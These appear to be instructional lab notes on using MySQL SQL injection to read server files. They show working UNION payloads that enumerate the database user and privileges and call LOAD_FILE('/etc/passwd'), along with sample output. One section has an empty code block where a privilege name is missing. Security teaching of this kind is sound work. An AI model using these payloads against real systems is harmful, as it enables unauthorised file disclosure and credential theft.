## Purpose

SQL Injection can sometimes be used to **read files from the underlying operating system**.

This allows attackers to:

- read sensitive OS files
- retrieve application source code
- extract credentials
- locate configuration secrets
- identify additional vulnerabilities
- move toward Remote Code Execution (RCE)

Reading files typically requires elevated database privileges.

---

# Required Privilege

In MySQL / MariaDB, the database user must have the:

```
FILE
```

privilege.

Without this privilege:

```
LOAD_FILE() will fail
```

Modern DBMS configurations often restrict file access to:

- DB administrators (DBA)
- privileged service accounts

---

# Step 1 – Identify Current Database User

We first determine which user the database is running as.

## Queries

```sql
SELECT USER()
```

```sql
SELECT CURRENT_USER()
```

```sql
SELECT user FROM mysql.user
```

---

## UNION Injection Payload

```sql
cn' UNION SELECT 1,user(),3,4-- -
```

or:

```sql
cn' UNION SELECT 1,user,3,4 FROM mysql.user-- -
```

---

## Example Result

```
root@localhost
```

This is promising because:

```
root likely has DBA privileges
```

---

# Step 2 – Check Privileges

We need to confirm whether the DB user has permission to read files.

---

## Check Super Privileges

```sql
SELECT super_priv FROM mysql.user;
```

Injection:

```sql
cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user-- -
```

---

## Filter specific user

```sql
cn' UNION SELECT 1,super_priv,3,4 
FROM mysql.user 
WHERE user="root"-- -
```

---

## Example Output

```
Y
```

Meaning:

```
YES – superuser privileges present
```

---

# Enumerate All Privileges

Privileges can also be enumerated via INFORMATION_SCHEMA.

---

## Query

```sql
SELECT grantee, privilege_type 
FROM information_schema.user_privileges;
```

---

## Injection Payload

```sql
cn' UNION SELECT 1,grantee,privilege_type,4 
FROM information_schema.user_privileges-- -
```

---

## Filter current user

```sql
cn' UNION SELECT 1,grantee,privilege_type,4 
FROM information_schema.user_privileges 
WHERE grantee="'root'@'localhost'"-- -
```

---

```

Important privilege:

```

This enables:

- reading files

# Step 3 – Read Files Using LOAD_FILE()

MySQL provides:

```
LOAD_FILE()
```

Function for reading OS files.

---

## Syntax

```sql
SELECT LOAD_FILE('/path/to/file');
```

---

## Example – read /etc/passwd

```sql
SELECT LOAD_FILE('/etc/passwd');
```

---

## UNION Injection Payload

```sql
cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
```

---

## Example Output

```
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:mysql:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

# Requirements for LOAD_FILE()

LOAD_FILE() works only if:

1. DB user has FILE privilege
2. file is readable by MySQL service account
3. file path is correct
4. MySQL secure_file_priv does not restrict directory access

---

# secure_file_priv Restriction

Some MySQL configurations restrict file operations to specific directory.

Check value:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

If set:

```
/var/lib/mysql-files/
```

LOAD_FILE may only access files in that directory.

---

# Why File Read is Powerful

File read access may reveal:

- database passwords
- API tokens
- SSH keys
- application secrets
- configuration files
- hidden endpoints
- environment variables

These can enable:

- lateral movement
- privilege escalation
- remote command execution

---

# Key Takeaways

- SQLi can extend beyond database access
- FILE privilege enables OS interaction
- LOAD_FILE() reads local files
- source code disclosure often leads to further compromise
- privilege enumeration is critical before attempting file operations
